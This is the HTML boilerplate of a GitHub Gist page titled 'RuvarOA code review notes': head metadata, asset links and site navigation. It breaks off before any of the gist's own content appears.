





<!DOCTYPE html>
<html
  lang="en"
  
  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
  data-a11y-animated-images="system" data-a11y-link-underlines="true"
  
  >



  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
  <link rel="preconnect" href="https://avatars.githubusercontent.com">

  

  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-0cfd1fd8509e.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-d782f59290e2.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-f9fbc4b99a77.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-cff1c9b27b1a.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-70097f75aec1.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-c2f0d49bdcd9.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-4747d7bc0bc4.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-d3f6a61c91c8.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-a188d53f44bb.css" />

    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-953961b66e63.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-20f98ef38fd8.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-7e1d0e4dee6a.css" />
    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-e72829f5538b.css" />
  

  


  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["alive_longer_retries","bypass_copilot_indexing_quota","copilot_new_references_ui","copilot_beta_features_opt_in","copilot_chat_retry_on_error","copilot_chat_persist_submitted_input","copilot_conversational_ux_history_refs","copilot_editor_upsells","copilot_free_limited_user","copilot_implicit_context","copilot_no_floating_button","copilot_smell_icebreaker_ux","experimentation_azure_variant_endpoint","failbot_handle_non_errors","geojson_azure_maps","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","hovercard_accessibility","issues_react_remove_placeholders","issues_react_blur_item_picker_on_close","marketing_pages_search_explore_provider","react_keyboard_shortcuts_dialog","remove_child_patch","sample_network_conn_type","site_metered_billing_update","site_copilot_free","lifecycle_label_name_updates"]}</script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-278066c97335.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover_js-9da652f58479.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_arianotify-polyfill_ariaNotify-polyfill_js-node_modules_github_mi-3abb8f-d7e6bc799724.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_failbot_failbot_ts-71291b73d826.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/environment-7b93e0f0c8ff.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-ea2a5d75d580.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-f690fd9ae3d5.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-f6da4b3fa34c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-8e9f78-a74b4e0a8a6b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-78748950cb0c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-b5f1d7-a1760ffda83d.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-ceef33f593fa.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-c44a69-c6d035fa8dc8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-f991cfab5105.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-3b5362d3d402.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-7f43298e364b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-be8cb88f481b.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_morphdom_dist_morphdom-e-7c534c-a4a1922eb55f.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-e3cbe28f1638.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-6cf3320416b8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-e3180fe3bcb3.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-69cfcc-833249ee3034.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_updatable-content_updatable-content_ts-863ef5872a03.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_sso_ts-ui_packages-900dde-917d4bda1f1a.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-7cbef09a422c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-d0d0a6-b41aeef03499.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-fb43816ab83c.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-999d1d44cef0.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-f6223d90c7ba.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-cfcd9f4f0f23.js"></script>
  
  <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_hotkey_dist_index_js-524e40420665.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_remote-form_dist_-d0eef7-5f58a29a0546.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_form-utils_form-utils_ts-ui_packages_input-navigation-behavior_input-navigation-b-a97423-0ee33bdc7197.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_diffs_blob-lines_ts-app_assets_modules_github_diffs_linkable-line-n-b8c0ea-be4e711b7e28.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/gist-7ae34499530e.js"></script>


  <title>RuvarOA code review notes · GitHub</title>



  <meta name="route-pattern" content="/:user_id/:gist_id(.:format)" data-turbo-transient>
  <meta name="route-controller" content="gists_gists" data-turbo-transient>
  <meta name="route-action" content="show" data-turbo-transient>

    
  <meta name="current-catalog-service-hash" content="56253a530ab9027b25719525dcbe6007461a3202218f6f5dfce5a601c121cbcb">


  <meta name="request-id" content="C0DA:36E8A3:1163C6F:1551345:6782A8DF" data-pjax-transient="true"/><meta name="html-safe-nonce" content="18bb4f4b7997f0b7dd0f4843612310ea8d508a464d6df62ab31644193f02f1b3" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiJDMERBOjM2RThBMzoxMTYzQzZGOjE1NTEzNDU6Njc4MkE4REYiLCJ2aXNpdG9yX2lkIjoiMjA4NTkyMjMzMjk5OTc0Mzc3NCIsInJlZ2lvbl9lZGdlIjoibmUtMDEiLCJyZWdpb25fcmVuZGVyIjoibm9ydGhldXJvcGUifQ==" data-pjax-transient="true"/><meta name="visitor-hmac" content="029bd6d8416eb4f0408c452331686225497082fd95f90b3b1ad3231b2cf914d5" data-pjax-transient="true"/>




  <meta name="github-keyboard-shortcuts" content="copilot" data-turbo-transient="true" />
  

  <meta name="selected-link" value="gist_code" data-turbo-transient>
  <link rel="assets" href="https://github.githubassets.com/">

    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">

<meta name="octolytics-url" content="https://collector.github.com/github/collect" />

  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;gist-id&gt;" data-turbo-transient="true" /><meta name="octolytics-location" content="/&lt;user-name&gt;/&lt;gist-id&gt;" data-turbo-transient="true" />

  




    <meta name="user-login" content="">

  

    <meta name="viewport" content="width=device-width">

    

      <meta name="description" content="RuvarOA code review notes. GitHub Gist: instantly share code, notes, and snippets.">

      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch-gist.xml" title="Gist">

    <link rel="fluid-icon" href="https://gist.github.com/fluidicon.png" title="GitHub">
    <meta property="fb:app_id" content="1401488693436528">
    <meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d" />

      <meta name="twitter:image" content="https://github.githubassets.com/assets/gist-og-image-54fd7dc0713e.png" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="RuvarOA code review notes" /><meta name="twitter:description" content="RuvarOA code review notes. GitHub Gist: instantly share code, notes, and snippets." />
  <meta property="og:image" content="https://github.githubassets.com/assets/gist-og-image-54fd7dc0713e.png" /><meta property="og:image:alt" content="RuvarOA code review notes. GitHub Gist: instantly share code, notes, and snippets." /><meta property="og:site_name" content="Gist" /><meta property="og:type" content="article" /><meta property="og:title" content="RuvarOA code review notes" /><meta property="og:url" content="https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d" /><meta property="og:description" content="RuvarOA code review notes. GitHub Gist: instantly share code, notes, and snippets." /><meta property="article:author" content="262588213843476" /><meta property="article:publisher" content="262588213843476" />
  




      <meta name="hostname" content="gist.github.com">



        <meta name="expected-hostname" content="gist.github.com">


  <meta http-equiv="x-pjax-version" content="b6d271ea4c4be2122891e67fa7f4ae1c9160fc654c74b27b2102cce3baf5a142" data-turbo-track="reload">
  <meta http-equiv="x-pjax-csp-version" content="ace39c3b6632770952207593607e6e0be0db363435a8b877b1f96abe6430f345" data-turbo-track="reload">
  <meta http-equiv="x-pjax-css-version" content="91684edb2a1719c4c35d97255f97853f94708cdd9a7c3a773ae63c57032ce418" data-turbo-track="reload">
  <meta http-equiv="x-pjax-js-version" content="cada3c8d9f0d3df6b8c249a94478caac54d306f7853b81b07da44afdbf8c1fad" data-turbo-track="reload">

  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">

      <link href="/Mr-xn.atom" rel="alternate" title="atom" type="application/atom+xml">

  <meta name="robots" content="noindex, follow" />
  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/gist-4afe775cc576.css" />




    <meta name="turbo-body-classes" content="logged-out env-production page-responsive">


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">

<meta name="theme-color" content="#1e2327">
<meta name="color-scheme" content="light dark" />



  </head>

  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
    <div data-turbo-body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
      


    <div class="position-relative header-wrapper js-header-wrapper ">
      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>

      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
</span>      
      
      <script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-eb226383faf4.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-core-85b0640cddc8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-2131e17288a8.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-611691cca2f6.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_tanstack_query-core_build_modern_queryClient_js-e6f07a7e80b7.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-37e3d5-92730c05e718.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_stacktrace-parser_dist_s-e7dcdd-f7cc96ebae76.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-55fea94174bf.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ui-commands_ui-commands_ts-fecaee5fb732.js"></script>
<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/keyboard-shortcuts-dialog-958cae8ecd6c.js"></script>
<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react.491a1e189efd351d2e8c.module.css" />

<react-partial
  partial-name="keyboard-shortcuts-dialog"
  data-ssr="false"
  data-attempted-ssr="false"
>
  
  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
  <div data-target="react-partial.reactRoot"></div>
</react-partial>




      

            <div class="Header js-details-container Details flex-wrap flex-md-nowrap p-responsive" role="banner" >
  <div class="Header-item d-none d-md-flex">
    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
  <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 68 24" version="1.1" width="68" data-view-component="true" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block">
    <path d="M27.8 17.908h-.03c.013 0 .022.014.035.017l.01-.002-.016-.015Zm.005.017c-.14.001-.49.073-.861.073-1.17 0-1.575-.536-1.575-1.234v-4.652h2.385c.135 0 .24-.12.24-.283V9.302c0-.133-.12-.252-.24-.252H25.37V5.913c0-.119-.075-.193-.21-.193h-3.24c-.136 0-.21.074-.21.193V9.14s-1.636.401-1.741.416a.255.255 0 0 0-.195.253v2.021c0 .164.12.282.255.282h1.665v4.876c0 3.627 2.55 3.998 4.29 3.998.796 0 1.756-.252 1.906-.327.09-.03.135-.134.135-.238v-2.23a.264.264 0 0 0-.219-.265Zm35.549-3.272c0-2.69-1.095-3.047-2.25-2.928-.9.06-1.62.505-1.62.505v5.232s.735.506 1.83.536c1.545.044 2.04-.506 2.04-3.345ZM67 14.415c0 5.099-1.665 6.555-4.576 6.555-2.46 0-3.78-1.233-3.78-1.233s-.06.683-.135.773c-.045.089-.12.118-.21.118h-2.22c-.15 0-.286-.119-.286-.252l.03-16.514a.26.26 0 0 1 .255-.252h3.196a.26.26 0 0 1 .255.252v5.604s1.23-.788 3.03-.788l-.015-.03c1.8 0 4.456.67 4.456 5.767ZM53.918 9.05h-3.15c-.165 0-.255.119-.255.282v8.086s-.826.58-1.95.58c-1.126 0-1.456-.506-1.456-1.62v-7.06a.262.262 0 0 0-.255-.254h-3.21a.262.262 0 0 0-.256.253v7.596c0 3.27 1.846 4.087 4.381 4.087 2.085 0 3.78-1.145 3.78-1.145s.076.58.12.67c.03.074.136.133.24.133h2.011a.243.243 0 0 0 .255-.253l.03-11.103c0-.133-.12-.252-.285-.252Zm-35.556-.015h-3.195c-.135 0-.255.134-.255.297v10.91c0 .297.195.401.45.401h2.88c.3 0 .375-.134.375-.401V9.287a.262.262 0 0 0-.255-.252ZM16.787 4.01c-1.155 0-2.07.907-2.07 2.051 0 1.145.915 2.051 2.07 2.051a2.04 2.04 0 0 0 2.04-2.05 2.04 2.04 0 0 0-2.04-2.052Zm24.74-.372H38.36a.262.262 0 0 0-.255.253v6.08H33.14v-6.08a.262.262 0 0 0-.255-.253h-3.196a.262.262 0 0 0-.255.253v16.514c0 .133.135.252.255.252h3.196a.262.262 0 0 0 .255-.253v-7.06h4.966l-.03 7.06c0 .134.12.253.255.253h3.195a.262.262 0 0 0 .255-.253V3.892a.262.262 0 0 0-.255-.253Zm-28.31 7.313v8.532c0 .06-.015.163-.09.193 0 0-1.875 1.323-4.966 1.323C4.426 21 0 19.84 0 12.2S3.87 2.986 7.651 3c3.27 0 4.59.728 4.8.862.06.075.09.134.09.208l-.63 2.646c0 .134-.134.297-.3.253-.54-.164-1.35-.49-3.255-.49-2.205 0-4.575.623-4.575 5.543s2.25 5.5 3.87 5.5c1.38 0 1.875-.164 1.875-.164V13.94H7.321c-.165 0-.285-.12-.285-.253v-2.735c0-.134.12-.252.285-.252h5.61c.166 0 .286.118.286.252Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 38 24" version="1.1" width="38" data-view-component="true" class="octicon octicon-logo-gist v-align-middle d-none d-md-inline-block">
    <path d="M7.05 13.095v-1.5h5.28v8.535c-1.17.555-2.925.96-5.385.96C1.665 21.09 0 17.055 0 12.045S1.695 3 6.945 3c2.43 0 3.96.495 4.92.99v1.575c-1.83-.75-3-1.095-4.92-1.095-3.855 0-5.22 3.315-5.22 7.59s1.365 7.575 5.205 7.575c1.335 0 2.97-.105 3.795-.51v-6.03H7.05Zm16.47 1.035h.045c3.33.3 4.125 1.425 4.125 3.345 0 1.815-1.14 3.615-4.71 3.615-1.125 0-2.745-.285-3.495-.585v-1.41c.705.255 1.83.54 3.495.54 2.43 0 3.09-1.035 3.09-2.13 0-1.065-.33-1.815-2.655-2.01-3.39-.3-4.095-1.5-4.095-3.12 0-1.665 1.08-3.465 4.38-3.465 1.095 0 2.34.135 3.375.585v1.41c-.915-.3-1.83-.54-3.405-.54-2.325 0-2.82.855-2.82 2.01 0 1.035.42 1.56 2.67 1.755Zm12.87-4.995v1.275h-3.63v7.305c0 1.425.795 2.01 2.25 2.01.3 0 .63 0 .915-.045v1.335c-.255.045-.75.075-1.035.075-1.965 0-3.75-.9-3.75-3.195v-7.5H28.8v-.72l2.34-.66V5.85l1.62-.465v3.75h3.63ZM16.635 9.09v9.615c0 .81.285 1.05 1.005 1.05v1.335c-1.71 0-2.58-.705-2.58-2.58V9.09h1.575Zm.375-3.495c0 .66-.51 1.17-1.17 1.17a1.14 1.14 0 0 1-1.155-1.17c0-.66.48-1.17 1.155-1.17s1.17.51 1.17 1.17Z"></path>
</svg>
</a>
  </div>

  <div class="Header-item d-md-none">
      <button aria-label="Toggle navigation" aria-expanded="false" type="button" data-view-component="true" class="Header-link js-details-target btn-link">    <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-three-bars">
    <path d="M3.75 5.25a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Zm0 6a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Zm0 6a.75.75 0 0 0 0 1.5h16.5a.75.75 0 0 0 0-1.5H3.75Z"></path>
</svg>
</button>  </div>

  <div class="Header-item Header-item--full js-site-search flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div class="header-search flex-self-stretch flex-md-self-auto mr-0 mr-md-3 mb-3 mb-md-0">
    <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="position-relative js-quicksearch-form" role="search" aria-label="Site" data-turbo="false" action="/search" accept-charset="UTF-8" method="get">
      <div class="header-search-wrapper form-control input-sm js-chromeless-input-container">
        <input type="text"
          class="form-control input-sm js-site-search-focus header-search-input"
          data-hotkey="s,/"
          name="q"
          aria-label="Search"
          placeholder="Search…"
          autocorrect="off"
          autocomplete="off"
          autocapitalize="off">
      </div>

</form></div>


    <nav aria-label="Global" class="d-flex flex-column flex-md-row flex-self-stretch flex-md-self-auto">
  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, go to all gists, text:all gists" href="/discover">All gists</a>

  <a class="Header-link mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, go to GitHub, text:Back to GitHub" href="https://github.com">Back to GitHub</a>

    <a class="Header-link d-block d-md-none mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, sign in" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="1a43b88b028fb4af292c7162ac2a1e44dc0d09a8634b7d846f2dded0fd2b6b62" href="https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FMr-xn%2Fbc8261a5c3e35a72768723acf1da358d">
      Sign in
</a>
      <a class="Header-link d-block d-md-none mr-0 mr-md-3 py-2 py-md-0 border-top border-md-top-0 border-white-fade" data-ga-click="Header, sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;gist header&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://gist.github.com/Mr-xn/bc8261a5c3e35a72768723acf1da358d&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="bda0b041563258ea9a294af5fb86c50bf84ed621446e2e8e357a6c4dd0f1631f" href="/join?return_to=https%3A%2F%2Fgist.github.com%2FMr-xn%2Fbc8261a5c3e35a72768723acf1da358d&amp;source=header-gist">
        Sign up
</a></nav>

  </div>

  <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
    <a class="Header-link" data-hotkey="g d" aria-label="Gist Homepage " href="/">
  <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github v-align-middle d-inline-block d-md-none">
    <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z"></path>
</svg>
  <svg aria-hidden="true" height="24" viewBox="0 0 68 24" version="1.1" width="68" data-view-component="true" class="octicon octicon-logo-github v-align-middle d-none d-md-inline-block">
    <path d="M27.8 17.908h-.03c.013 0 .022.014.035.017l.01-.002-.016-.015Zm.005.017c-.14.001-.49.073-.861.073-1.17 0-1.575-.536-1.575-1.234v-4.652h2.385c.135 0 .24-.12.24-.283V9.302c0-.133-.12-.252-.24-.252H25.37V5.913c0-.119-.075-.193-.21-.193h-3.24c-.136 0-.21.074-.21.193V9.14s-1.636.401-1.741.416a.255.255 0 0 0-.195.253v2.021c0 .164.12.282.255.282h1.665v4.876c0 3.627 2.55 3.998 4.29 3.998.796 0 1.756-.252 1.906-.327.09-.03.135-.134.135-.238v-2.23a.264.264 0 0 0-.219-.265Zm35.549-3.272c0-2.69-1.095-3.047-2.25-2.928-.9.06-1.62.505-1.62.505v5.232s.735.506 1.83.536c1.545.044 2.04-.506 2.04-3.345ZM67 14.415c0 5.099-1.665 6.555-4.576 6.555-2.46 0-3.78-1.233-3.78-1.233s-.06.683-.135.773c-.045.089-.12.118-.21.118h-2.22c-.15 0-.286-.119-.286-.252l.03-16.514a.26.26 0 0 1 .255-.252h3.196a.26.26 0 0 1 .255.252v5.604s1.23-.788 3.03-.788l-.015-.03c1.8 0 4.456.67 4.456 5.767ZM53.918 9.05h-3.15c-.165 0-.255.119-.255.282v8.086s-.826.58-1.95.58c-1.126 0-1.456-.506-1.456-1.62v-7.06a.262.262 0 0 0-.255-.254h-3.21a.262.262 0 0 0-.256.253v7.596c0 3.27 1.846 4.087 4.381 4.087 2.085 0 3.78-1.145 3.78-1.145s.076.58.12.67c.03.074.136.133.24.133h2.011a.243.243 0 0 0 .255-.253l.03-11.103c0-.133-.12-.252-.285-.252Zm-35.556-.015h-3.195c-.135 0-.255.134-.255.297v10.91c0 .297.195.401.45.401h2.88c.3 0 .375-.134.375-.401V9.287a.262.262 0 0 0-.255-.252ZM16.787 4.01c-1.155 0-2.07.907-2.07 2.051 0 1.145.915 2.051 2.07 2.051a2.04 2.04 0 0 0 2.04-2.05 2.04 2.04 0 0 0-2.04-2.052Zm24.74-.372H38.36a.262.262 0 0 